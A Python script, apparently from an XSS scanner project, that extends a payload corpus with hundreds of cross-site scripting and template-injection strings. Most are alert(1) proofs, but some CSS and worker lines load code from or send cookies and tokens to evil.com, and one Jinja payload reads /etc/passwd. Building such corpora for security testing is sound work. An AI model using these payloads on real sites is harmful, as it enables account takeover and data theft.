"""Extend payloads.json with 700+ new attack shapes (Phase 19).

Focus on NOVEL base payload shapes that the runtime multi_encode.py
engine cannot generate by encoding existing entries:

  - Framework template injection (React/Vue/Angular/Svelte/Mustache/Handlebars)
  - SVG / MathML foreign content (deep variants)
  - DOM clobbering gadget chains (dedicated context)
  - CSS injection (expression / @import / font / animation)
  - Mutation XSS sequences
  - Service Worker / Web Worker injection
  - postMessage source payloads
  - Prototype pollution -> XSS gadgets
  - Markdown / BBCode injection
  - HTTP header reflection (UA / Referer / Cookie / X-Forwarded-For)
  - Path-based XSS
  - Error page injection
  - JSONP callback variants
  - Modern WAF bypass shapes (runtime encoders don't generate these)
  - Base64 eval / data URI / exotic scheme
  - HTML5 new tags / attributes
  - Dangling markup injection (for data exfiltration)
  - Script gadget injection (jQuery / Knockout / Ember)
  - CSS exfiltration (for data theft without JS)

Idempotent: skips payloads whose `payload` text already exists.
Also normalizes `confidence` to string ("high"/"medium"/"low") to fix
the schema inconsistency from extend_payloads.py.
"""
import json, os, sys

PATH = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                    "xssentinel", "data", "payloads.json")

with open(PATH, "r", encoding="utf-8") as f:
    data = json.load(f)

# --- Schema normalization: convert float confidence to string -------------
# extend_payloads.py wrote floats (0.7); base corpus uses strings ("high").
# Unify on strings to match the original schema.
_conf_map = {0.85: "high", 0.75: "medium", 0.7: "medium", 0.6: "low",
             0.5: "low"}
for p in data["payloads"]:
    c = p.get("confidence")
    if isinstance(c, float):
        p["confidence"] = _conf_map.get(c, "medium")
    elif isinstance(c, int) and not isinstance(c, bool):
        p["confidence"] = _conf_map.get(c, "medium")

existing = {p["payload"] for p in data["payloads"]}
added = 0


def add(context, payload, tags, confidence="medium", note=""):
    """Add a payload entry.  confidence is a string: high/medium/low."""
    global added
    if payload in existing:
        return
    pid = f"{context}_{len(data['payloads'])+1:04d}"
    data["payloads"].append({
        "id": pid,
        "context": context,
        "payload": payload,
        "tags": tags,
        "confidence": confidence,
        "note": note,
    })
    existing.add(payload)
    added += 1


# Add new contexts to _meta if not present.
_meta_contexts = set(data["_meta"]["contexts"])
for ctx in ("dom_clobber", "framework_react", "framework_vue",
            "framework_angular", "framework_svelte", "framework_mustache",
            "markdown", "service_worker", "postmessage_source",
            "prototype_gadget", "header_reflection", "path_xss",
            "error_page", "dangling_markup", "script_gadget",
            "css_exfil", "data_uri", "html5_new"):
    if ctx not in _meta_contexts:
        _meta_contexts.add(ctx)
        data["_meta"]["contexts"].append(ctx)


# ==========================================================================
# 1. Framework template injection (150)
# ==========================================================================

# --- Angular (30) ---
angular = [
    "{{constructor.constructor('alert(1)')()}}",
    "{{$on.constructor('alert(1)')()}}",
    "{{$eval('alert(1)')}}",
    "{{a='constructor';b={};b[a].constructor('alert(1)')()}}",
    "{{[].constructor.constructor('alert(1)')()}}",
    "{{0['constructor']['constructor']('alert(1)')()}}",
    "{{'a]'.constructor.prototype.charAt=''.constructor.prototype.fromCharCode;"
    "alert(1)}}",
    "{{x={'y':''.constructor.prototype};x['y'].charAt=alert}}",
    "{{toString.constructor.prototype.valueOf=alert(1)}}",
    "{{a=alert;a(1)}}",
    "{{alert(1)}}",
    "[ng-binding]{{alert(1)}}",
    "<div ng-app>{{alert(1)}}</div>",
    "<div ng-app ng-csp>{{x={'y':''.constructor.prototype};x['y']."
    "charAt=alert}}</div>",
    "{{'abc'.constructor.prototype.charAt=''.constructor.prototype."
    "fromCharCode;alert(1)}}",
    "{{$root.constructor.constructor('alert(1)')()}}",
    "{{'a]'.constructor.prototype.indexOf=''.constructor.prototype."
    "fromCharCode;alert(1)}}",
    "{{a=[].constructor.constructor('alert(1)');a()}}",
    "{{'a]'.constructor.prototype.charCodeAt=alert}}",
    "{{x={};x.constructor.constructor('alert(1)')()}}",
    "{{'a]'.constructor.prototype.concat=alert}}",
    "{{'a]'.constructor.prototype.trim=alert}}",
    "{{'a]'.constructor.prototype.split=alert}}",
    "{{'a]'.constructor.prototype.substr=alert}}",
    "{{'a]'.constructor.prototype.substring=alert}}",
    "{{'a]'.constructor.prototype.toLowerCase=alert}}",
    "{{'a]'.constructor.prototype.toUpperCase=alert}}",
    "{{$evalcomparator='a]'.constructor.prototype.charAt=''.constructor."
    "prototype.fromCharCode;alert(1)}}",
    "{{'a]'.constructor.prototype.replace=alert}}",
    "{{'a]'.constructor.prototype.search=alert}}",
]
for p in angular:
    add("framework_angular", p, ["angular", "template", "csp_bypass"],
        confidence="high", note="Angular template expression sandbox escape")

# --- Vue (25) ---
vue = [
    "{{$root.constructor.constructor('alert(1)')()}}",
    "{{_c.constructor('alert(1)')()}}",
    "{{_v.constructor('alert(1)')()}}",
    "{{a={}.constructor.constructor;a('alert(1)')()}}",
    "{{b=_c.constructor;b('alert(1)')()}}",
    "{{$options.render.constructor('alert(1)')()}}",
    "{{$root.$options.render.constructor('alert(1)')()}}",
    "{{_c('div',{on:{click:alert}})}}",
    "{{_c('img',{attrs:{src:'x'},on:{error:alert}})}}",
    "{{$event.constructor.constructor('alert(1)')()}}",
    "{{Function('alert(1)')()}}",
    "{{(function(){return this})().constructor.constructor('alert(1)')()}}",
    "{{$root.$watch('a',function(){alert(1)})}}",
    "<div v-on:click='alert(1)'>x</div>",
    "<div @click='alert(1)'>x</div>",
    "<div v-html='\"<img src=x onerror=alert(1)>\"'></div>",
    "<div :innerHTML='\"<img src=x onerror=alert(1)>\"'></div>",
    "<div v-bind:innerHTML='\"<script>alert(1)</script>\"'></div>",
    "<img :src='\"x\"' @error='alert(1)'>",
    "<div v-for='x in [alert(1)]'>{{x}}</div>",
    "{{$forceUpdate()}}",
    "{{$nextTick(function(){alert(1)})}}",
    "{{$emit('x',alert(1))}}",
    "{{$root.constructor.constructor('return alert(1)')()}}",
    "{{globalThis.alert(1)}}",
]
for p in vue:
    add("framework_vue", p, ["vue", "template", "csp_bypass"],
        confidence="high", note="Vue template expression / v-html / event handler")

# --- React (20) ---
react = [
    "<img src=x onError={alert(1)}>",
    "<img src=x onError={() => alert(1)}>",
    "<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}} />",
    "<a href={javascript:alert(1)}>x</a>",
    "<a href={`javascript:alert(1)`}>x</a>",
    "<iframe src={javascript:alert(1)} />",
    "<svg><onload>{alert(1)}</onload></svg>",
    "<input value={javascript:alert(1)} />",
    "<form action={javascript:alert(1)}>",
    "<object data={javascript:alert(1)} />",
    "<embed src={javascript:alert(1)} />",
    "<video><source src={javascript:alert(1)} /></video>",
    "<audio src={javascript:alert(1)}>",
    "<script dangerouslySetInnerHTML={{__html: 'alert(1)'}} />",
    "<div ref={el => { el.innerHTML='<img src=x onerror=alert(1)>' }} />",
    "<button onClick={() => { eval('alert(1)') }}>x</button>",
    "<a href={`data:text/html,<script>alert(1)</script>`}>x</a>",
    "<div {...{innerHTML: '<img src=x onerror=alert(1)>'}} />",
    "<img src={`x`} ref={i => i ? i.onerror=alert : null} />",
    "<div onClick={eval} data-payload={alert(1)} />",
]
for p in react:
    add("framework_react", p, ["react", "jsx", "dangerouslySetInnerHTML"],
        confidence="high", note="React JSX sink / dangerouslySetInnerHTML / event handler")

# --- Svelte (15) ---
svelte = [
    "<img src=x on:error={alert(1)}>",
    "<div on:click={alert(1)}>x</div>",
    "<script>alert(1)</script>",
    "<div>{@html '<img src=x onerror=alert(1)>'}</div>",
    "<a href={javascript:alert(1)}>x</a>",
    "<iframe src={javascript:alert(1)} />",
    "<img src=x on:error={() => alert(1)}>",
    "<div on:mouseenter={alert(1)}>x</div>",
    "<button on:click={() => eval('alert(1)')}>x</button>",
    "<div use:action={(node) => node.innerHTML = '<img src=x onerror=alert(1)>'} />",
    "<svg><on:load={alert(1)} /></svg>",
    "<input on:focus={alert(1)} />",
    "<form on:submit|preventDefault={alert(1)}>",
    "<a href={`data:text/html,<script>alert(1)</script>`}>x</a>",
    "<svelte:component this={() => { eval('alert(1)') }} />",
]
for p in svelte:
    add("framework_svelte", p, ["svelte", "template", "@html"],
        confidence="high", note="Svelte template / @html / event handler")

# --- Mustache / Handlebars (20) ---
mustache = [
    "{{=<% %>=}}<%alert(1)%>",
    "{{#with 'a'}}{{/with}}{{alert(1)}}",
    "{{&alert(1)}}",
    "{{>alert(1)}}",
    "{{#each this}}{{alert(1)}}{{/each}}",
    "{{#if alert(1)}}x{{/if}}",
    "{{#unless alert(1)}}x{{/unless}}",
    "{{this.constructor.constructor('alert(1)')()}}",
    "{{lookup this 'constructor'}}",
    "{{#blockHelper alert(1)}}x{{/blockHelper}}",
    "{{__proto__.constructor.constructor('alert(1)')()}}",
    "{{constructor.constructor('alert(1)')()}}",
    "{{a='constructor';b=[];b[a].constructor('alert(1)')()}}",
    "{{#with (lookup this 'constructor')}}{{.constructor('alert(1)')()}}{{/with}}",
    "{{> ['alert(1)'] }}",
    "{{#inline 'alert(1)'}}x{{/inline}}",
    "{{#partial alert(1)}}x{{/partial}}",
    "{{#helper alert(1)}}x{{/helper}}",
    "{{#blockHelperMissing alert(1)}}x{{/blockHelperMissing}}",
    "{{#each (lookup this 'constructor')}}{{.constructor('alert(1)')()}}{{/each}}",
]
for p in mustache:
    add("framework_mustache", p, ["mustache", "handlebars", "template"],
        confidence="medium", note="Mustache/Handlebars template helper / delimiter override")

# --- Ember / Knockout / Backbone / Polymer (20) ---
ember_etc = [
    "{{action 'alert(1)'}}",  # Ember
    "{{component (alert(1))}}",  # Ember
    "{{link-to (alert(1)) 'x'}}",  # Ember
    "{{input value=alert(1)}}",  # Ember
    "{{textarea value=alert(1)}}",  # Ember
    "{{#each (alert(1)) as |x|}}{{x}}{{/each}}",  # Ember
    "{{#let (alert(1)) as |x|}}{{x}}{{/let}}",  # Ember
    "<script type='text/x-handlebars'>{{alert(1)}}</script>",  # Ember
    "{{unbound alert(1)}}",  # Ember
    "{{yield (alert(1))}}",  # Ember
    "<div data-bind='html: \"<img src=x onerror=alert(1)>'></div>",  # Knockout
    "<div data-bind='click: alert(1)'></div>",  # Knockout
    "<div data-bind='event: { mouseover: alert(1) }'></div>",  # Knockout
    "<div data-bind='attr: { onmouseover: \"alert(1)\" }'></div>",  # Knockout
    "<div data-bind='style: { background: \"url(javascript:alert(1))\" }'></div>",  # Knockout
    "<div data-bind='template: { html: \"<img src=x onerror=alert(1)>\" }'></div>",  # Knockout
    "<polymer-element name='x-foo'><script>alert(1)</script></polymer-element>",  # Polymer
    "<dom-module id='x-foo'><script>alert(1)</script></dom-module>",  # Polymer
    "<x-foo on-tap='{{alert(1)}}'></x-foo>",  # Polymer
    "<template is='dom-bind'><script>alert(1)</script></template>",  # Polymer
]
for p in ember_etc:
    add("framework_angular", p, ["ember", "knockout", "polymer", "template"],
        confidence="medium", note="Ember/Knockout/Polymer template / data-bind")

# --- EJS / Pug / Nunjucks / Twig / Jinja (20) ---
ejs_etc = [
    "<%=alert(1)%>",  # EJS
    "<%-alert(1)%>",  # EJS (unescaped)
    "<%Function('alert(1)')()%>",  # EJS
    "<%include alert(1)%>",  # EJS
    "<%#alert(1)%>",  # EJS comment exec
    "#{alert(1)}",  # Pug
    "-alert(1)",  # Pug
    "!=alert(1)",  # Pug unescaped
    "p=alert(1)",  # Pug
    "div(onclick='alert(1)')",  # Pug
    "{{alert(1)}}",  # Nunjucks
    "{{alert(1)|safe}}",  # Nunjucks
    "{%alert(1)%}",  # Nunjucks block
    "{{alert(1)|raw}}",  # Twig
    "{{alert(1)|e('html')}}",  # Twig
    "{%set x=alert(1)%}",  # Twig
    "{{alert(1).__class__.__mro__[1].__subclasses__()}}",  # Jinja
    "{{config}}",  # Jinja
    "{{request.application}}",  # Jinja
    "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}",  # Jinja
]
for p in ejs_etc:
    add("framework_mustache", p, ["ejs", "pug", "nunjucks", "twig", "jinja",
                                   "ssti"],
        confidence="medium", note="Server-side template injection (SSTI)")


# ==========================================================================
# 2. SVG / MathML foreign content (80)
# ==========================================================================
svg_payloads = [
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    "<svg><animate attributeName=href values=javascript:alert(1)>",
    "<svg><animate attributeName=xlink:href values=javascript:alert(1)>",
    "<svg><set onbegin=alert(1) attributename=x>",
    "<svg><set attributeName=href values=javascript:alert(1)>",
    "<svg><discard onbegin=alert(1)>",
    "<svg><a><animate attributeName=href values=javascript:alert(1)>",
    "<svg><a xlink:href=javascript:alert(1)><text>x</text></a>",
    "<svg><use href=data:image/svg+xml;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+>",
    "<svg><use xlink:href=data:image/svg+xml;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+>",
    "<svg><image href=javascript:alert(1)>",
    "<svg><image xlink:href=javascript:alert(1)>",
    "<svg><foreignObject><script>alert(1)</script></foreignObject>",
    "<svg><foreignObject><body onload=alert(1)>",
    "<svg><foreignObject><iframe src=javascript:alert(1)>",
    "<svg><script>alert(1)</script>",
    "<svg><script type='application/ecmascript'>alert(1)</script>",
    "<svg><script type='text/javascript'>alert(1)</script>",
    "<svg><script xlink:href=javascript:alert(1)>",
    "<svg><script href=javascript:alert(1)>",
    "<svg><handler xml: type='text/ecmascript'>alert(1)</handler>",
    "<svg><listener event='load' observer='x' handler='#h'/>"
    "<handler id='h' type='text/ecmascript'>alert(1)</handler>",
    "<svg><set attributeName=onload to=alert(1)>",
    "<svg><set attributeName=innerHTML to='<img src=x onerror=alert(1)>'>",
    "<svg><animate attributeName=innerHTML values='<img src=x onerror=alert(1)>'>",
    "<svg><a href=javascript:alert(1)>x</a>",
    "<svg><a href=`javascript:alert(1)`>x</a>",
    "<svg onload=alert(1)>",
    "<svg onload=`alert(1)`>",
    "<svg onload=alert(1)//>",
    "<svg/onload=alert(1)>",
    "<svg/onload=alert(1)//>",
    "<svg onload =alert(1)>",
    "<svg onload\t=\talert(1)>",
    "<svg onload\n=\nalert(1)>",
    "<svg onload=\r\nalert(1)>",
    "<svg onload=\x09alert(1)>",
    "<svg onload=\x0aalert(1)>",
    "<svg onload=\x0dalert(1)>",
    "<svg onload=\x00alert(1)>",
    "<svg><image src=x onerror=alert(1)>",
    "<svg><image src=x:onerror=alert(1)>",
    "<svg><image src=x onerror='alert(1)'>",
    "<svg><image src=x onerror=\"alert(1)\">",
    "<svg><image src=`x` onerror=`alert(1)`>",
    "<svg><rect onload=alert(1)>",
    "<svg><circle onload=alert(1)>",
    "<svg><ellipse onload=alert(1)>",
    "<svg><line onload=alert(1)>",
    "<svg><polyline onload=alert(1)>",
    "<svg><polygon onload=alert(1)>",
    "<svg><path onload=alert(1)>",
    "<svg><text onload=alert(1)>",
    "<svg><g onload=alert(1)>",
    "<svg><defs onload=alert(1)>",
    "<svg><symbol onload=alert(1)>",
    "<svg><use onload=alert(1)>",
    "<svg><style onload=alert(1)>",
    "<svg><script onload=alert(1)>",
    "<svg><image onload=alert(1)>",
    "<svg><foreignObject onload=alert(1)>",
    "<svg><a onload=alert(1)>",
    "<svg><title onload=alert(1)>",
    "<svg><desc onload=alert(1)>",
    "<svg><metadata onload=alert(1)>",
    "<svg><view onload=alert(1)>",
    "<svg><filter onload=alert(1)>",
    "<svg><pattern onload=alert(1)>",
    "<svg><marker onload=alert(1)>",
    "<svg><clipPath onload=alert(1)>",
    "<svg><mask onload=alert(1)>",
    "<svg><linearGradient onload=alert(1)>",
    "<svg><radialGradient onload=alert(1)>",
    "<svg><stop onload=alert(1)>",
    "<svg><image src=1 href=2 onerror=alert(1)>",
    "<svg><animateMotion onbegin=alert(1)>",
    "<svg><animateTransform onbegin=alert(1)>",
    "<svg><mpath onbegin=alert(1)>",
    "<svg><feGaussianBlur onbegin=alert(1)>",
    "<svg><feImage href=javascript:alert(1)>",
    "<svg><feImage xlink:href=javascript:alert(1)>",
]
for p in svg_payloads:
    add("svg_context", p, ["svg", "foreign_content", "animate", "use"],
        confidence="high", note="SVG foreign content / SMIL animation / use element")

math_payloads = [
    "<math><maction actiontype='statusline#http://google.com' xlink:href='javascript:alert(1)'>",
    "<math><maction actiontype='relocate#http://google.com' xlink:href='javascript:alert(1)'>",
    "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
    "<math><mtext><table><mglyph><style><!--</style><script>alert(1)</script>",
    "<math><mtext><img src=x onerror=alert(1)>",
    "<math><mtext><script>alert(1)</script>",
    "<math><mtext><svg onload=alert(1)>",
    "<math><mtext><iframe src=javascript:alert(1)>",
    "<math><mi xlink:href=javascript:alert(1)>x</mi>",
    "<math><mo xlink:href=javascript:alert(1)>x</mo>",
    "<math><mn xlink:href=javascript:alert(1)>x</mn>",
    "<math><ms xlink:href=javascript:alert(1)>x</ms>",
    "<math><mrow xlink:href=javascript:alert(1)>x</mrow>",
    "<math><mfrac xlink:href=javascript:alert(1)>x</mfrac>",
    "<math><msqrt xlink:href=javascript:alert(1)>x</msqrt>",
    "<math><mroot xlink:href=javascript:alert(1)>x</mroot>",
    "<math><msub xlink:href=javascript:alert(1)>x</msub>",
    "<math><msup xlink:href=javascript:alert(1)>x</msup>",
    "<math><msubsup xlink:href=javascript:alert(1)>x</msubsup>",
    "<math><munder xlink:href=javascript:alert(1)>x</munder>",
]
for p in math_payloads:
    add("math_context", p, ["mathml", "foreign_content", "xlink"],
        confidence="high", note="MathML foreign content / xlink attribute")


# ==========================================================================
# 3. DOM clobbering gadget chains (60) — dedicated context
# ==========================================================================
dom_clobber = [
    "<img id=x name=x>",
    "<img id=x>",
    "<img name=x>",
    "<form id=x>",
    "<form name=x>",
    "<a id=x>",
    "<a name=x>",
    "<img id=x name=y>",
    "<img id=x><img id=x>",
    "<form id=x><input name=attributes>",
    "<form id=x><input name=nodeName>",
    "<form id=x><input name=removeChild>",
    "<form id=x><input name=firstChild>",
    "<form id=x><input name=lastChild>",
    "<form id=x><input name=appendChild>",
    "<form id=x><input name=replaceChild>",
    "<form id=x><input name=insertBefore>",
    "<form id=x><input name=cloneNode>",
    "<form id=x><input name=ownerDocument>",
    "<form id=x><input name=parentNode>",
    "<form id=x><input name=nextSibling>",
    "<form id=x><input name=previousSibling>",
    "<form id=x><input name=documentElement>",
    "<form id=x><input name=getElementById>",
    "<form id=x><input name=getElementsByTagName>",
    "<form id=x><input name=querySelector>",
    "<form id=x><input name=querySelectorAll>",
    "<form id=x><input name=innerHTML>",
    "<form id=x><input name=outerHTML>",
    "<form id=x><input name=textContent>",
    "<a id=x href=javascript:alert(1)>",
    "<a id=x href=data:text/html,<script>alert(1)</script>>",
    "<a id=x name=location href=javascript:alert(1)>",
    "<a id=x name=document href=javascript:alert(1)>",
    "<a id=x name=window href=javascript:alert(1)>",
    "<a id=x name=self href=javascript:alert(1)>",
    "<a id=x name=top href=javascript:alert(1)>",
    "<a id=x name=parent href=javascript:alert(1)>",
    "<a id=x name=frames href=javascript:alert(1)>",
    "<a id=x name=globalThis href=javascript:alert(1)>",
    "<img id=x name=src>",
    "<img id=x name=href>",
    "<img id=x name=action>",
    "<img id=x name=data>",
    "<img id=x name=formaction>",
    "<img id=x name=background>",
    "<img id=x name=poster>",
    "<img id=x name=list>",
    "<img id=x name=ping>",
    "<img id=x name=manifest>",
    "<img id=x name=cite>",
    "<img id=x name=longdesc>",
    "<img id=x name=usemap>",
    "<img id=x name=profile>",
    "<img id=x name=archive>",
    "<img id=x name=classid>",
    "<img id=x name=code>",
    "<img id=x name=codebase>",
    "<img id=x name=datafld>",
    "<img id=x name=datasrc>",
    "<img id=x name=href><a id=x href=javascript:alert(1)>",
]
for p in dom_clobber:
    add("dom_clobber", p, ["dom_clobber", "id_shadow", "named_property"],
        confidence="high", note="DOM clobbering: named property access shadow / gadget chain")


# ==========================================================================
# 4. CSS injection (50)
# ==========================================================================
css_payloads = [
    "<style>@import 'javascript:alert(1)';</style>",
    "<style>@import url(javascript:alert(1));</style>",
    "<style>@import url('javascript:alert(1)');</style>",
    "<style>@import url(\"javascript:alert(1)\");</style>",
    "<style>@import url(data:text/html,<script>alert(1)</script>);</style>",
    "<style>body{background:url(javascript:alert(1))}</style>",
    "<style>body{background:url('javascript:alert(1)')}</style>",
    "<style>body{background-image:url(javascript:alert(1))}</style>",
    "<style>body{background-image:url('javascript:alert(1)')}</style>",
    "<style>body{background:url(data:image/svg+xml,<svg onload=alert(1)>)}</style>",
    "<style>body{background:url('data:image/svg+xml,<svg onload=alert(1)>')}</style>",
    "<style>body{list-style:url(javascript:alert(1))}</style>",
    "<style>body{list-style-image:url(javascript:alert(1))}</style>",
    "<style>body{list-style-image:url('javascript:alert(1)')}</style>",
    "<style>body{cursor:url(javascript:alert(1))}</style>",
    "<style>body{cursor:url('javascript:alert(1)')}</style>",
    "<style>body{content:url(javascript:alert(1))}</style>",
    "<style>body:before{content:url(javascript:alert(1))}</style>",
    "<style>body:after{content:url(javascript:alert(1))}</style>",
    "<style>body{behavior:url(javascript:alert(1))}</style>",  # IE
    "<style>body{-moz-binding:url(javascript:alert(1))}</style>",  # FF old
    "<style>@font-face{src:url(javascript:alert(1))}</style>",
    "<style>@font-face{src:url('javascript:alert(1)')}</style>",
    "<style>@font-face{font-family:x;src:url(javascript:alert(1))}</style>",
    "<style>@keyframes x{from{background:url(javascript:alert(1))}}</style>",
    "<style>@keyframes x{0%{background:url(javascript:alert(1))}}</style>",
    "<style>@keyframes x{100%{background:url(javascript:alert(1))}}</style>",
    "<style>@keyframes x{from{left:0}to{left:expression(alert(1))}}</style>",  # IE
    "<style>body{left:expression(alert(1))}</style>",  # IE
    "<style>body{x:expression(alert(1))}</style>",  # IE
    "<style>body{width:expression(alert(1))}</style>",  # IE
    "<style>body{height:expression(alert(1))}</style>",  # IE
    "<style>body{background:expression(alert(1))}</style>",  # IE
    "<style>input{background:expression(alert(1))}</style>",  # IE
    "<style>div{background:expression(alert(1))}</style>",  # IE
    "<style>*{background:expression(alert(1))}</style>",  # IE
    "<style>@import '//evil.com/x.css';</style>",
    "<style>@import url(//evil.com/x.css);</style>",
    "<style>@import url('//evil.com/x.css');</style>",
    "<style>@import url(\"//evil.com/x.css\");</style>",
    "<style>@import url(https://evil.com/x.css);</style>",
    "<style>@import url('https://evil.com/x.css');</style>",
    "<style>@import url(\"https://evil.com/x.css\");</style>",
    "<style>@import url(http://evil.com/x.css);</style>",
    "<style>body{background:url(//evil.com/log?cookie=)</style>",
    "<style>body{background:url(//evil.com/log?cookie='+document.cookie)}</style>",
    "<style>body{background:url(//evil.com/log?token=)</style>",
    "<style>input[value^=admin]{background:url(//evil.com/log?admin)}</style>",
    "<style>input[value^=secret]{background:url(//evil.com/log?secret)}</style>",
    "<style>:focus{background:url(//evil.com/log?focus)}</style>",
]
for p in css_payloads:
    add("css_context", p, ["css", "expression", "import", "font_face",
                            "keyframes", "exfil"],
        confidence="high", note="CSS expression / @import / font-face / "
        "animation / CSS exfiltration")


# ==========================================================================
# 5. Mutation XSS (40)
# ==========================================================================
mxss_payloads = [
    "<svg><style><img src=x onerror=alert(1)></style>",
    "<svg><style></style><img src=x onerror=alert(1)>",
    "<svg><style>/*</style><img src=x onerror=alert(1)></svg>",
    "<svg><style>*/</style><img src=x onerror=alert(1)></svg>",
    "<svg><desc><img src=x onerror=alert(1)></desc></svg>",
    "<svg><title><img src=x onerror=alert(1)></title></svg>",
    "<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>",
    "<svg><foreignObject><body onload=alert(1)></foreignObject></svg>",
    "<svg><foreignObject><script>alert(1)</script></foreignObject></svg>",
    "<math><style><img src=x onerror=alert(1)></style>",
    "<math><mtext><style><img src=x onerror=alert(1)></style>",
    "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
    "<math><mtext><table><mglyph><style><!--</style><script>alert(1)</script>",
    "<math><mtext><table><mglyph><style><!--</style><svg onload=alert(1)>",
    "<noscript><img src=x onerror=alert(1)></noscript>",
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
    "<template><img src=x onerror=alert(1)></template>",
    "<template><script>alert(1)</script></template>",
    "<template><svg onload=alert(1)></template>",
    "<select><template><img src=x onerror=alert(1)></template></select>",
    "<select><noscript><img src=x onerror=alert(1)></noscript></select>",
    "<select><style><img src=x onerror=alert(1)></style></select>",
    "<select><style></style><img src=x onerror=alert(1)></select>",
    "<svg><style><![CDATA[</style><img src=x onerror=alert(1)>]]></style>",
    "<svg><style><![CDATA[]]></style><img src=x onerror=alert(1)>",
    "<svg><foreignObject><![CDATA[</foreignObject><img src=x onerror=alert(1)>]]></foreignObject>",
    "<svg><desc><![CDATA[</desc><img src=x onerror=alert(1)>]]></desc>",
    "<svg><title><![CDATA[</title><img src=x onerror=alert(1)>]]></title>",
    "<svg><style><!--</style><img src=x onerror=alert(1)>--></style>",
    "<svg><style>/*<!--*/</style><img src=x onerror=alert(1)></svg>",
    "<svg><style>/*]]>*/</style><img src=x onerror=alert(1)></svg>",
    "<math><mtext><table><mglyph><style>/*</style><img src=x onerror=alert(1)>",
    "<math><mtext><table><mglyph><style>*/</style><img src=x onerror=alert(1)>",
    "<svg><style>/*</style>*/<img src=x onerror=alert(1)>",
    "<svg><style>/*</style>*/</style><img src=x onerror=alert(1)>",
    "<svg><style>/*</style><img src=x onerror=alert(1)>/*</style>",
    "<svg><style>/*</style><img src=x onerror=alert(1)>*/</style>",
    "<svg><style>/*</style><img src=x onerror=alert(1)>*/</svg>",
    "<svg><style>/*</style><img src=x onerror=alert(1)>--></svg>",
    "<svg><style>/*</style><img src=x onerror=alert(1)>]]></svg>",
]
for p in mxss_payloads:
    add("html_element", p, ["mxss", "mutation", "foreign_content", "cdata",
                             "style_escape"],
        confidence="high", note="Mutation XSS: parser context confusion "
        "via <style>/<foreignObject>/CDATA/<!-- escape")


# ==========================================================================
# 6. Service Worker / Web Worker injection (30)
# ==========================================================================
sw_payloads = [
    "<script>navigator.serviceWorker.register('/sw.js')</script>",
    "<script>navigator.serviceWorker.register('javascript:alert(1)')</script>",
    "<script>navigator.serviceWorker.register('data:text/javascript,alert(1)')</script>",
    "<script>navigator.serviceWorker.register('//evil.com/sw.js')</script>",
    "<script>navigator.serviceWorker.register('https://evil.com/sw.js')</script>",
    "<script>navigator.serviceWorker.register('/sw.js',{scope:'/'})</script>",
    "<script>navigator.serviceWorker.register('/sw.js',{updateViaCache:'all'})</script>",
    "<script>new Worker('javascript:alert(1)')</script>",
    "<script>new Worker('data:text/javascript,alert(1)')</script>",
    "<script>new Worker('//evil.com/w.js')</script>",
    "<script>new Worker('https://evil.com/w.js')</script>",
    "<script>new SharedWorker('javascript:alert(1)')</script>",
    "<script>new SharedWorker('data:text/javascript,alert(1)')</script>",
    "<script>new SharedWorker('//evil.com/w.js')</script>",
    "<script>new SharedWorker('https://evil.com/w.js')</script>",
    "<script>new Worker(URL.createObjectURL(new Blob(['alert(1)'],{type:'text/javascript'})))</script>",
    "<script>new SharedWorker(URL.createObjectURL(new Blob(['alert(1)'],{type:'text/javascript'})))</script>",
    "<script>navigator.serviceWorker.register(URL.createObjectURL(new Blob(['alert(1)'],{type:'text/javascript'})))</script>",
    "<script>new Worker('data:application/javascript,alert(1)')</script>",
    "<script>new Worker('data:application/x-javascript,alert(1)')</script>",
    "<script>new Worker('data:text/ecmascript,alert(1)')</script>",
    "<script>new Worker('data:application/ecmascript,alert(1)')</script>",
    "<script>new Worker('blob:https://evil.com/abc')</script>",
    "<script>navigator.serviceWorker.register('blob:https://evil.com/abc')</script>",
    "<script>new Worker('javascript:importScripts(\"//evil.com/x.js\")')</script>",
    "<script>new Worker('data:text/javascript,importScripts(\"//evil.com/x.js\")')</script>",
    "<script>navigator.serviceWorker.register('/sw.js').then(r=>r.addEventListener('updatefound',()=>alert(1)))</script>",
    "<script>navigator.serviceWorker.addEventListener('message',e=>eval(e.data))</script>",
    "<script>navigator.serviceWorker.controller.postMessage('alert(1)')</script>",
    "<script>new Worker('/w.js').postMessage('alert(1)')</script>",
]
for p in sw_payloads:
    add("service_worker", p, ["service_worker", "web_worker", "shared_worker",
                               "blob_url", "data_uri"],
        confidence="high", note="Service Worker / Web Worker registration "
        "with attacker-controlled script URL")


# ==========================================================================
# 7. postMessage source payloads (30)
# ==========================================================================
postmsg_payloads = [
    "<script>window.postMessage('alert(1)','*')</script>",
    "<script>window.postMessage({__proto__:{},data:'alert(1)'},'*')</script>",
    "<script>parent.postMessage('alert(1)','*')</script>",
    "<script>top.postMessage('alert(1)','*')</script>",
    "<script>opener.postMessage('alert(1)','*')</script>",
    "<script>frames[0].postMessage('alert(1)','*')</script>",
    "<script>window.postMessage('<img src=x onerror=alert(1)>','*')</script>",
    "<script>window.postMessage({type:'xss',payload:'alert(1)'},'*')</script>",
    "<script>window.postMessage({origin:'javascript:alert(1)'},'*')</script>",
    "<script>window.postMessage({source:'javascript:alert(1)'},'*')</script>",
    "<script>window.postMessage({data:{__proto__:{},constructor:{prototype:{}}}'],'*')</script>",
    "<script>window.postMessage(JSON.stringify({x:'alert(1)'}),'*')</script>",
    "<script>window.postMessage('alert(1)','https://target.com')</script>",
    "<script>window.postMessage('alert(1)','/')</script>",
    "<script>window.postMessage({toString:function(){alert(1)}},'*')</script>",
    "<script>window.postMessage({valueOf:function(){alert(1)}},'*')</script>",
    "<script>parent.postMessage({type:'webpackOk',data:'alert(1)'},'*')</script>",
    "<script>parent.postMessage({type:'vue-devtools-init',data:'alert(1)'},'*')</script>",
    "<script>parent.postMessage({source:'react-devtools-content-script',data:'alert(1)'},'*')</script>",
    "<script>parent.postMessage({type:'__rewire__',data:'alert(1)'},'*')</script>",
    "<script>parent.postMessage({type:'sync',data:'alert(1)'},'*')</script>",
    "<script>parent.postMessage({type:'rpc',method:'alert(1)'},'*')</script>",
